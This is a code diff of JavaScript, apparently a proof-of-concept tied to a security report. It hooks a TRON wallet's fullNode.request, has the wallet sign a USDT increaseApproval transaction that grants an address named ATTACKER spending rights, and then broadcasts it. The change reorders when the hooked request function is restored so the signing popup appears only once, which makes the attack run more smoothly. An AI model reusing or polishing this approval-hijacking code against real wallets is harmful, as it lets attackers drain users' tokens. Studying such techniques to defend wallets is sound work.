@@ -309,52 +309,35 @@ async function exec() {
     } catch(fb) {
       L('Fallback 也失败: '+fb.message,'e');
       tw.fullNode.request = origReq;
-      L('fullNode.request 已恢复','w');
       D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
       return;
     }
   }
 
-  // --- 步骤 4: 签名 (报告第 10 节) ---
-  L('步骤4: 请求钱包签名…','w');
+  // --- 步骤 4: 先恢复 fullNode.request，防止 TP sign() 内部校验再次命中拦截器导致双弹窗 ---
+  tw.fullNode.request = origReq;
+  L('步骤4: fullNode.request 已恢复 (签名前)','s');
+
+  // --- 步骤 5: 签名 (报告第 10 节) ---
+  L('步骤5: 请求钱包签名…','w');
   L('  请核对钱包弹窗: 合约='+USDT_CONTRACT+' 方法=increaseApproval 授权对象='+ATTACKER.b58,'e');
 
-  let signed = null, errs = [];
-
-  if (!signed && window.tronWeb?.trx?.sign) {
-    try {
-      const r = window.tronWeb.trx.sign(unsignedTx);
-      signed = r?.then ? await r : r;
-      if (signed?.signature) L('window.tronWeb.trx.sign 成功','s');
-    } catch(e) { errs.push('TP sign: '+e.message); L('TP sign 失败: '+e.message,'w'); }
-  }
-
-  if (!signed && window.tronLink?.request) {
-    try {
-      signed = await window.tronLink.request({ method:'tron_signTransaction', params:unsignedTx });
-      if (signed?.signature) L('tronLink.request 成功','s');
-    } catch(e) { errs.push('TL sign: '+e.message); L('TL sign 失败: '+e.message,'w'); }
-  }
-
-  if (!signed && tw.trx?.sign) {
-    try {
-      signed = await tw.trx.sign(unsignedTx);
-      if (signed?.signature) L('tw.trx.sign 成功','s');
-    } catch(e) { errs.push('tw sign: '+e.message); L('tw sign 失败: '+e.message,'w'); }
+  let signed = null;
+  try {
+    const r = window.tronWeb.trx.sign(unsignedTx);
+    signed = r?.then ? await r : r;
+  } catch(e) {
+    L('签名失败: '+e.message,'e');
+    D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
+    return;
   }
 
   if (!signed?.signature) {
-    L('所有签名方式均失败','e'); errs.forEach(e=>L('  '+e,'e'));
-    tw.fullNode.request = origReq;
-    L('fullNode.request 已恢复','w');
+    L('签名未返回 signature','e');
     D.btnExec.disabled = false; D.btnExec.textContent = '确 认';
     return;
   }
   L('签名完成 txID='+signed.txID,'s');
-
-  // --- 步骤 5: 恢复 (报告第 11 节) ---
-  tw.fullNode.request = origReq;
-  L('步骤5: fullNode.request 已恢复','s');
 
   // --- 步骤 6: 广播 (报告第 12-13 节) ---
   L('步骤6: 广播 sendRawTransaction…','i');
